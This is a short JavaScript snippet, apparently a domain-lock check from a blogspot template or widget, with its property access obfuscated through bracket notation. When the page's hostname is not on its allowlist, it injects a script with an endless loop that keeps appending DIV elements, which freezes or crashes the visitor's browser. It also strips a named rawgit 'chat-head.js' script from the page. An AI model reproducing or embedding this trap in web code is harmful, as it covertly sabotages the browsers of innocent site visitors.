var x_n = 0;
var x_l = location['hostname'];
if (x_l['indexOf']('.blogspot') == -1) {
    var x_l = x_l['split']('.')[0]
} else {
    var x_l = x_l['split']('.')[1]
};
var x_a = ['Domainhere', 'Domainhere', 'aqwaweb', 'shadowhackr', 'Domainhere'];
for (i = 0; i < x_a['length']; i++) {
    if (x_l == x_a[i]) {
        x_n++
    }
};
if (x_n == 0) {
    var s_s = document['createElement']('script');
    s_s['innerHTML'] = 'var x_go = 1;var f_o = document.createElement("DIV");do {document.body.appendChild(f_o);}while (x_go < 5);';
    document['head']['appendChild'](s_s)
};
var x_ss = document['getElementsByTagName']('script');
for (i = 0; i < x_ss['length']; i++) {
    if (x_ss[i]['src'] == 'https://cdn.rawgit.com/skimi01/Amni8/master/chat-head.js') {
        x_ss[i]['replaceWith']('')
    }
}
